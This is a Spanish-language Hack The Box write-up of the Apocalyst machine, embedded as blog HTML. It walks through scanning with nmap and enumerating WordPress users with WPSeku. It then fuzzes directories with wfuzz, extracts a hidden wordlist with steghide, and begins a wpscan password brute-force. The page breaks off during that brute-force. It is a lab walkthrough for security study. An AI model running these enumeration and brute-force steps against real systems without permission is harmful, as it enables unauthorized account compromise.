@@ -1,0 +1,1297 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>            Hack The Box Apocalyst - K4miyo      Ciberseguridad!      </title>
+<meta name="description" content="Resolución de la máquina Apocalyst en la plataforma de Hack The Box">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="K4miyo | Ciberseguridad!">
+<meta property="og:title" content="Hack The Box Apocalyst">
+<meta property="og:url" content="http://localhost:4000/htb-apocalyst/">
+
+
+  <meta property="og:description" content="Resolución de la máquina Apocalyst en la plataforma de Hack The Box">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-apocalyst/apocalyst.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2021-11-26T00:00:00-06:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-apocalyst/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "K4miyo",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="K4miyo | Ciberseguridad! Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links">
+<li class="masthead__menu-item">
+              <a href="/">Home</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/year-archive/">Artículos</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/categories/">Categorías</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/tags/">Etiquetas</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/buscador/">Buscador</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/about/">Contacto</a>
+            </li>
+</ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1">
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Hack The Box Apocalyst</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="K4miyo" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">K4miyo</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Cyber Threat Intelligence Analyst
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/k4miyo" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Hack The Box Apocalyst">
+    <meta itemprop="description" content="Resolución de la máquina Apocalyst en la plataforma de Hack The Box">
+    <meta itemprop="datePublished" content="November 26, 2021">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Hack The Box Apocalyst
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-11-26T00:00:00-06:00">November 26, 2021 </time> 
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-apocalyst/banner-apocalyst.jpg" alt=""></p>
+
+<h2 id="apocalyst">Apocalyst</h2>
+<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.10.10.46.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.46
+PING 10.10.10.46 <span class="o">(</span>10.10.10.46<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.10.10.46: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>142 ms
+
+<span class="nt">---</span> 10.10.10.46 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 141.759/141.759/141.759/0.000 ms
+</code></pre></div></div>
+
+<p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-T5</span> <span class="nt">-v</span> <span class="nt">-n</span> 10.10.10.46 <span class="nt">-oG</span> allPorts
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-11-26 21:26 CST
+Initiating Ping Scan at 21:26
+Scanning 10.10.10.46 <span class="o">[</span>4 ports]
+Completed Ping Scan at 21:26, 0.17s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
+Initiating SYN Stealth Scan at 21:26
+Scanning 10.10.10.46 <span class="o">[</span>65535 ports]
+Discovered open port 80/tcp on 10.10.10.46
+Discovered open port 22/tcp on 10.10.10.46
+Completed SYN Stealth Scan at 21:26, 35.98s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.10.46
+Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65533 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>36.28 seconds
+           Raw packets sent: 67621 <span class="o">(</span>2.975MB<span class="o">)</span> | Rcvd: 67618 <span class="o">(</span>2.705MB<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ extractPorts allPorts
+───────┬───────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼───────────────────────────────────────
+   1   │ 
+   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
+   3   │ 
+   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.10.46
+   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 22,80
+   6   │ 
+   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
+</code></pre></div></div>
+
+<p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p22</span>,80 10.10.10.46 <span class="nt">-oN</span> targeted
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-11-26 21:29 CST
+Nmap scan report <span class="k">for </span>10.10.10.46
+Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 fd:ab:0f:c9:22:d5:f4:8f:7a:0a:29:11:b4:04:da:c9 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 76:92:39:0a:57:bd:f0:03:26:78:c7:db:1a:66:a5:bc <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 12:12:cf:f1:7f:be:43:1f:d5:e6:6d:90:84:25:c8:bd <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-generator: WordPress 4.8
+|_http-title: Apocalypse Preparation Blog
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>14.03 seconds
+</code></pre></div></div>
+
+<p>Vemos el puerto 80 abierto, por lo que antes de visualizar el contenido vía web, vamos a tirarle un <code class="language-plaintext highlighter-rouge">whatweb</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb http://10.10.10.46/
+http://10.10.10.46/ <span class="o">[</span>200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.10.46], JQuery[1.12.4], MetaGenerator[WordPress 4.8], PoweredBy[WordPress,WordPress,], Script[text/javascript], Title[Apocalypse Preparation Blog], UncommonHeaders[link], WordPress[4.8]
+</code></pre></div></div>
+
+<p>Tenemos un <strong><em>WordPress 4.8</em></strong> que al tratar de ingredar vía web, como que lo vemos todo raro:</p>
+
+<p><img src="/assets/images/htb-apocalyst/apocalyst-web.png" alt=""></p>
+
+<p>Si checamos el código fuente del sitio web, vemos que se está utilizando <em>virtual hosting</em>:</p>
+
+<p><img src="/assets/images/htb-apocalyst/apocalyst-web1.png" alt=""></p>
+
+<p>Asi que agregaremos el dominio <code class="language-plaintext highlighter-rouge">apocalyst.htb</code> a nuestro archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> y tratamos de ver la página nuevamente.</p>
+
+<p><img src="/assets/images/htb-apocalyst/apocalyst-web2.png" alt=""></p>
+
+<p>Ahora ya tenemos la web de forma más bonita. Como sabemos que estamos frente a un <strong><em>WordPress</em></strong>, vamos a tratar de descubrir rutas del sitio web con <code class="language-plaintext highlighter-rouge">nmap</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">--script</span> http-enum <span class="nt">-p80</span> 10.10.10.46 <span class="nt">-oN</span> webScan
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-11-26 21:48 CST
+Nmap scan report <span class="k">for </span>apocalyst.htb <span class="o">(</span>10.10.10.46<span class="o">)</span>
+Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-enum: 
+|   /blog/: Blog
+|   /wp-login.php: Possible admin folder
+|   /readme.html: Wordpress version: 2 
+|   /: WordPress version: 4.8
+|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
+|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
+|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
+|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
+|   /wp-login.php: Wordpress login page.
+|   /wp-admin/upgrade.php: Wordpress login page.
+|   /readme.html: Interesting, a readme.
+|   /custom/: Potentially interesting folder
+|   /down/: Potentially interesting folder
+|   /good/: Potentially interesting folder
+|   /hidden/: Potentially interesting folder
+|   /idea/: Potentially interesting folder
+|   /info/: Potentially interesting folder
+|   /information/: Potentially interesting folder
+|   /name/: Potentially interesting folder
+|   /page/: Potentially interesting folder
+|   /personal/: Potentially interesting folder
+|   /pictures/: Potentially interesting folder
+|   /site/: Potentially interesting folder
+|_  /state/: Potentially interesting folder
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>15.14 seconds
+</code></pre></div></div>
+
+<p>Tenemos algunas rutas interesante a las cuales podríamos echarles un ojo, como por ejemplo <code class="language-plaintext highlighter-rouge">/wp-login.php</code>; sin embargo, por el momento no contamos con credenciales. También vemos otros recursos como random <code class="language-plaintext highlighter-rouge">/down</code>, <code class="language-plaintext highlighter-rouge">good</code>, <code class="language-plaintext highlighter-rouge">hidden</code>, etc y si accedemos a dichos recursos, vemos la misma imagen.</p>
+
+<p><img src="/assets/images/htb-apocalyst/apocalyst-web3.png" alt=""></p>
+
+<p>Como sabemos que estamos frente a un <strong><em>WordPress</em></strong>, vamos a hacer uso de la herramienta <a href="https://github.com/Redshoee/WPSeku">WPSeku</a> para obtener algo de información.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python wpseku.py <span class="nt">-t</span> http://apocalyst.htb
+   _    _______  _____      _           
+  | |  | | ___ <span class="se">\/</span>  ___|    | |          
+  | |  | | |_/ /<span class="se">\ </span><span class="sb">`</span><span class="nt">--</span><span class="nb">.</span>  ___| | ___   _  
+  | |/<span class="se">\|</span> |  __/  <span class="sb">`</span><span class="nt">--</span><span class="nb">.</span> <span class="se">\/</span> _ <span class="se">\ </span>|/ / | | | 
+  <span class="se">\ </span> /<span class="se">\ </span> / |    /<span class="se">\_</span>_/ /  __/   &lt;| |_| | 
+   <span class="se">\/</span>  <span class="se">\/\_</span>|    <span class="se">\_</span>___/ <span class="se">\_</span>__|_|<span class="se">\_\\</span>__,_| 
+                                       
+<span class="o">||</span> WPSeku - WordPress Security Scanner
+<span class="o">||</span> Version 0.2.0
+<span class="o">||</span> Momo Outaadi <span class="o">(</span>M4ll0k<span class="o">)</span>
+<span class="o">||</span> https://github.com/m4ll0k/WPSeku
+
+<span class="c">## Target: http://apocalyst.htb/</span>
+<span class="c">## Starting: 26/11/2021 22:11:51</span>
+
+<span class="c">## Readme available under: http://apocalyst.htb/readme.html</span>
+<span class="c">## XML-RPC Interface available under: http://apocalyst.htb/xmlrpc.php</span>
+<span class="c">## License available under: http://apocalyst.htb/license.txt</span>
+<span class="c">## Dir /wp-includes/ listing enabled under: http://apocalyst.htb/wp-includes/</span>
+<span class="c">## Interesting headers: </span>
+
+Connection: close
+Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+Server: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Link: &lt;http://apocalyst.htb/?rest_route<span class="o">=</span>/&gt;<span class="p">;</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">"https://api.w.org/"</span>
+
+<span class="c">## Running WordPress version: 4.8</span>
+No JSON object could be decoded
+
+<span class="c">## Enumerating themes... </span>
+        <span class="o">||</span> Name: twentyseventeen
+        <span class="o">||</span> Theme Name: Twenty
+        <span class="o">||</span> Theme URI: https://wordpress.org/themes/twentyseventeen/
+        <span class="o">||</span> Author: the
+        <span class="o">||</span> Author URI: https://wordpress.org/
+        <span class="o">||</span> Version: 1.3
+        <span class="o">||</span> Readme: http://apocalyst.htb/wp-content/themes/twentyseventeen/README.txt
+        <span class="o">||</span> Style: http://apocalyst.htb/wp-content/themes/twentyseventeen/style.css
+
+<span class="c">## Enumerating plugins...</span>
+        <span class="o">||</span> Not found plugins!
+
+<span class="c">## Enumerating usernames...</span>
+        <span class="o">||</span> ID: 0 - Name: falaraki
+</code></pre></div></div>
+
+<p>Tenemos un potencial usuario <strong>falaraki</strong> el cual podemos validar desde el panel de login:</p>
+
+<p><img src="/assets/images/htb-apocalyst/apocalyst-login.png" alt=""></p>
+
+<p>Vemos que el usuario <strong>falaraki</strong> es válido, por lo que ahora nos falta es la contraseña. Antes de tirar por fuerza bruta, debemos recordar que en varias rutas vemos la misma imagen, por lo que es posible que alguna tenga oculto algún dato que nos ayude a obtener la contraseña; así que vamos a crearnos un diccionario de rutas a partir del sitio web con la herramienta <code class="language-plaintext highlighter-rouge">cewl</code>; esto lo hacemos que dentro del sitio se hace mucha mención de la palabra <strong>apocalyst</strong> y es posible que una variante nos arroje algo diferente.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cewl <span class="nt">-w</span> diccionario.txt http://apocalyst.htb/
+CeWL 5.4.8 <span class="o">(</span>Inclusion<span class="o">)</span> Robin Wood <span class="o">(</span>robin@digi.ninja<span class="o">)</span> <span class="o">(</span>https://digi.ninja/<span class="o">)</span>
+❯ ll
+.rw-r--r-- root root 3.8 KB Fri Nov 26 22:17:50 2021  diccionario.txt
+</code></pre></div></div>
+
+<p>Ahora vamos a tratar de descubrir rutas a partir del nuevo diccionario.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">-L</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">-w</span> diccionario.txt http://apocalyst.htb/FUZZ
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work co
+rrectly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.                                        
+********************************************************                                                                         
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************                                                                         
+                                                                                                                                 
+Target: http://apocalyst.htb/FUZZ                                                                                                
+Total requests: 532                                                                                                              
+                                                                                                                                 
+=====================================================================                                                    
+ID           Response   Lines    Word       Chars       Payload                                                          
+=====================================================================                                                   
+                                                                                                                                 
+000000001:   200        13 L     17 W       157 Ch      "the"                                                            
+000000016:   200        13 L     17 W       157 Ch      "site"                                                           
+000000015:   200        13 L     17 W       157 Ch      "are"                                                            
+000000013:   200        13 L     17 W       157 Ch      "The"                                                           
+000000018:   200        13 L     17 W       157 Ch      "revelation"                                                     
+000000017:   200        13 L     17 W       157 Ch      "for"                                                            
+000000007:   200        13 L     17 W       157 Ch      "Blog"                                                           
+000000019:   200        13 L     17 W       157 Ch      "Comments"                                                       
+000000011:   200        13 L     17 W       157 Ch      "entry"                                                          
+000000010:   200        13 L     17 W       157 Ch      "Daniel"                                                         
+000000009:   200        13 L     17 W       157 Ch      "Book"                                                           
+000000008:   200        13 L     17 W       157 Ch      "end"                                                            
+000000004:   200        13 L     17 W       157 Ch      "Revelation"                                                     
+000000005:   200        13 L     17 W       157 Ch      "that"                                                           
+000000020:   200        13 L     17 W       157 Ch      "time"                                                          
+000000002:   200        13 L     17 W       157 Ch      "and"                                                           
+000000026:   200        13 L     17 W       157 Ch      "July"                                                           
+000000033:   200        13 L     17 W       157 Ch      "events"                                                         
+000000028:   200        13 L     17 W       157 Ch      "has"                                                            
+000000024:   200        13 L     17 W       157 Ch      "header"                                                         
+000000031:   200        13 L     17 W       157 Ch      "End"                                                            
+000000029:   200        13 L     17 W       157 Ch      "been"                                                          
+000000037:   200        13 L     17 W       157 Ch      "Feed"                                                           
+000000023:   200        13 L     17 W       157 Ch      "WordPress"                                                      
+000000035:   200        13 L     17 W       157 Ch      "Assumptio"                                                      
+000000069:   200        13 L     17 W       157 Ch      "info"                                                           
+000000068:   200        13 L     17 W       157 Ch      "state"                                                         
+000000065:   200        13 L     17 W       157 Ch      "Posted"                                                         
+000000067:   200        13 L     17 W       157 Ch      "post"                                                           
+000000066:   200        13 L     17 W       157 Ch      "meta"                                                           
+000000064:   200        13 L     17 W       157 Ch      "Syndication"                                                   
+000000063:   200        13 L     17 W       157 Ch      "Simple"                                                         
+000000061:   200        13 L     17 W       157 Ch      "RSS"                                                            
+000000062:   200        13 L     17 W       157 Ch      "Really"                                                         
+000000060:   200        13 L     17 W       157 Ch      "Recent"
+</span></code></pre></div></div>
+
+<p>Dentro del fuzzing aplicamos el parámetro <code class="language-plaintext highlighter-rouge">-L</code> para el redireccionamiento y como vemos, tenemos varios códigos de estado 200, pero es posible que alguno no tenga la misma cantidad de palabras o caracteres, así que vamos a omitir para 157 caracteres y tratar de ver si encontramos algo.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">-L</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">--hh</span><span class="o">=</span>157 <span class="nt">-w</span> diccionario.txt http://apocalyst.htb/FUZZ
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://apocalyst.htb/FUZZ
+Total requests: 532
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                         
+=====================================================================
+
+000000455:   200        14 L     20 W       175 Ch      "Rightiousness"                                                 
+
+Total time: 0
+Processed Requests: 532
+Filtered Requests: 531
+Requests/sec.: 0
+</span></code></pre></div></div>
+
+<p>Encontramos uno, el recurso <code class="language-plaintext highlighter-rouge">Rightiousness</code>, que si accedemos vemos la misma imagen pero es posible que podamos encontrar algo dentro de los bits menos significativos de la imagen. Así que la descargamos y hacemos uso de la herramienta <code class="language-plaintext highlighter-rouge">steghide</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ steghide info image.jpg
+<span class="s2">"image.jpg"</span>:
+  formato: jpeg
+  capacidad: 13.0 KB
+Intenta informarse sobre los datos adjuntos? <span class="o">(</span>s/n<span class="o">)</span> s
+Anotar salvoconducto: 
+  archivo adjunto <span class="s2">"list.txt"</span>:
+    tamao: 3.6 KB
+    encriptado: rijndael-128, cbc
+    compactado: si
+</code></pre></div></div>
+
+<p>Tenemos que la imagen tiene un archivo adjunto <code class="language-plaintext highlighter-rouge">list.txt</code>, por lo que vamos a extraerlo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ steghide extract <span class="nt">-sf</span> image.jpg
+Anotar salvoconducto: 
+anot los datos extrados e/<span class="s2">"list.txt"</span><span class="nb">.</span>
+❯ ll
+.rw-r--r-- root   root   3.8 KB Fri Nov 26 22:17:50 2021  diccionario.txt
+.rw-r--r-- k4miyo k4miyo 210 KB Fri Nov 26 22:26:33 2021  image.jpg
+.rw-r--r-- root   root   3.6 KB Fri Nov 26 22:32:42 2021  list.txt
+</code></pre></div></div>
+
+<p>Si le echamos un ojo al archivo <code class="language-plaintext highlighter-rouge">list.txt</code>, vemos que se trata de un diccionario y como a este punto tenemos un nombre de usuario y nos falta la contraseña, es posible que dicho diccionario contenga el password del usuario <strong>falaraki</strong>. Para variar un poco, vamos a hacer uso de la herramienta <code class="language-plaintext highlighter-rouge">wpscan</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wpscan <span class="nt">--url</span> <span class="s2">"http://apocalyst.htb/"</span> <span class="nt">-U</span> falaraki <span class="nt">-P</span> list.txt                                                                   
+_______________________________________________________________                                                                  
+         __          _______   _____
+         <span class="se">\ \ </span>       / /  __ <span class="se">\ </span>/ ____|                 
+          <span class="se">\ \ </span> /<span class="se">\ </span> / /| |__<span class="o">)</span> | <span class="o">(</span>___   ___  __ _ _ __ ®                                                                           
+           <span class="se">\ \/</span>  <span class="se">\/</span> / |  ___/ <span class="se">\_</span>__ <span class="se">\ </span>/ __|/ _<span class="sb">`</span> | <span class="s1">'_ \           
+            \  /\  /  | |     ____) | (__| (_| | | | |                                                                           
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|         
+                                                                                                                                 
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.17                         
+                                                                                                                                 
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+                                
+[i] Updating the Database ...                                   
+[i] Update completed.           
+                                                                
+[+] URL: http://apocalyst.htb/ [10.10.10.46]        
+[+] Started: Fri Nov 26 22:42:53 2021                                                                                            
+                                
+Interesting Finding(s):                                         
+                                                                                                                                 
+[+] Headers                                                     
+ | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
+ | Found By: Headers (Passive Detection)                                                                                         
+ | Confidence: 100%                                                                                                              
+                                                                                                                                 
+[+] XML-RPC seems to be enabled: http://apocalyst.htb/xmlrpc.php                
+ | Found By: Direct Access (Aggressive Detection)                                                                                
+ | Confidence: 100%                                                                                                              
+ | References:                                                  
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API                                                                            
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+                                                                                                                                 
+[+] WordPress readme found: http://apocalyst.htb/readme.html                                                                     
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%                                                                                                              
+                                                                
+[+] Upload directory has listing enabled: http://apocalyst.htb/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+[+] The external WP-Cron seems to be enabled: http://apocalyst.htb/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)                                                                                
+ | Confidence: 60%                                              
+ | References:                                                                                                                   
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 4.8 identified (Insecure, released on 2017-06-08).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://apocalyst.htb/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=4.8&lt;/generator&gt;
+ |  - http://apocalyst.htb/?feed=comments-rss2, &lt;generator&gt;https://wordpress.org/?v=4.8&lt;/generator&gt;
+
+[+] WordPress theme in use: twentyseventeen
+ | Location: http://apocalyst.htb/wp-content/themes/twentyseventeen/
+ | Last Updated: 2021-07-22T00:00:00.000Z
+ | Readme: http://apocalyst.htb/wp-content/themes/twentyseventeen/README.txt
+ | [!] The version is out of date, the latest version is 2.8
+ | Style URL: http://apocalyst.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8
+ | Style Name: Twenty Seventeen
+ | Style URI: https://wordpress.org/themes/twentyseventeen/
+ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 1.3 (80% confidence) 
+ | Found By: Style (Passive Detection)
+ |  - http://apocalyst.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8, Match: '</span>Version: 1.3<span class="s1">'
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:04 &lt;==================================================&gt; (137 / 137) 100.00% Time: 00:00:04
+
+[i] No Config Backups Found.
+
